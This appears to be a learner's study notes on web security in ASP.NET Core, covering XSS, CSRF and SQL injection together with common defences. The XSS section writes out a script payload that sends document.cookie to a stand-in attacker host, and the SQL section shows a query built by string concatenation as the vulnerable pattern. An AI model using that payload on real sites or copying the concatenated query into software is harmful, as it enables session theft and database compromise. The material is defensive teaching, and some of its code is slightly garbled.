# I. Prevent cross-site scripting (XSS attacks) in ASP.NET Core
- how it work: attaker inject a JavaScript scripts into web page. This web will be viewed by another user, the inject script will run on user browser
- often used to steal session token, cookies
- This malicious script runs in the context of the victim’s session with the website and can both send requests and read the responses, including sensitive data like cookies, authentication tokens, and private information.

ex: 
1. Attacker finds a vulnerable input field (e.g., a comment box, search bar, or any field that accepts user input and reflects it on the page without proper sanitization).
2. Attacker injects malicious JavaScript into the field, such as a comment:
The attacker can post this script:
```
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```
3. Users visit the page, and the browser executes the malicious script because it treats the script as part of the web page.
4. The attacker’s script executes in the victim’s browser, potentially stealing sensitive data, modifying the web page, or performing actions on behalf of the victim.
## Common defences against XSS
### 1. Validate input
- Validate and sanitize all input fields to ensure that no malicious scripts can be injected.
### 2. Encoding output
- Properly encode all dynamic data before rendering it in the HTML to ensure special characters (e.g., <, >, &) are escaped.
### 3. HTTP-only cookies:
- set cookies attribute to HttpOnly that make cookie can't me modify by JavaScript

# II. CSRF (Cross-site requets forgery)
- how it work: through untruested website, attacker run some script that trick the user browser to perform some action at another web app (which the victim's is already logged in)
- the trick action could be: submitting a form change email/password, or transferring funds

ex: 
1. you open banking app has address https://abcbanking.com 
2. attacker sen you a link to website https://evilsite.com
3. This malicious website contains code that automatically submits a form (or sends a request) to abcbanking.com to transfer money to the KZ
NOTE: however the attacker can't se the response from abcbanking.com because evilsite.com is not allowed to access this response data, because the browser prevents cross-domain data access due to same-origin policy 
## Common defences against CSRF

### 1. CSRF tokens
- These are unique tokens generated by the server and included in HTML forms or headers. 
- The server verifies that the token sent with a request matches the one it generated. 
- If the token is missing or incorrect, the server rejects the request.
NOTE: Since the attacker cannot access the token (because of the same-origin policy), they cannot include it in a forged request, preventing the attack.

### 2. Use Strict SameSite cookie restrictions
- SameSite is a cookie attribute that restricts how cookies are sent with cross-site requests.
- The SameSite attribute can have the following values:
    - Strict: Cookies are only sent with same-site requests (from the same domain) and never with cross-site requests.
    - Lax: Cookies are sent with top-level navigations (e.g., when a user clicks a link) but not with embedded requests like iframes or AJAX requests.
    - None: Cookies are sent with both same-site and cross-site requests, but the request must be secured using HTTPS.

### 4. User Authentication Re-verification
- Requiring users to re-enter their password or use multi-factor authentication (MFA) before performing sensitive actions (e.g., changing email addresses or making financial transactions) ensures that the action is coming from the authenticated user and not from a forged request.



# III. Prevent SQL injection in ASP.NET Core app
- attacker input a query string to the input, this input later is use for dynamic database queries (which concat the input to the query string)
- to avoid we simply prevent malicious SQL input from being included in executed queries.
example:
```
String query = "SELECT account_balance FROM user_data WHERE user_name = "
             + request.getParameter("customerName");
try {
    Statement statement = connection.createStatement( ... );
    ResultSet results = statement.executeQuery( query );
}

```

## Defenses
### Option 1: Prepared Statement (with Parameterized Queries)
Always bind user inputs as parameters to avoid injecting raw data into SQL queries.
example:
```
String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
try {
  OleDbCommand command = new OleDbCommand(query, connection);
  command.Parameters.Add(new OleDbParameter("customerName", CustomerName Name.Text));
  OleDbDataReader reader = command.ExecuteReader();
  // …
} catch (OleDbException se) {
  // error handling
}
```

### Option 2: Stored Procedures: 
Ensure that user input is passed as parameters to stored procedures rather than concatenating raw SQL strings
### Option 3: Allow-list Input Validation
 It limits user inputs to only those values that are expected and safe. For example, if you expect a user to enter a number, the allow-list can block anything that isn’t a valid number (like SQL keywords or operators).
### Option 4: Object Relational Mapper
Use ORM frameworks (like SQLAlchemy in Python, or Entity Framework in .NET) that abstract away raw SQL queries, reducing the chances of SQL injection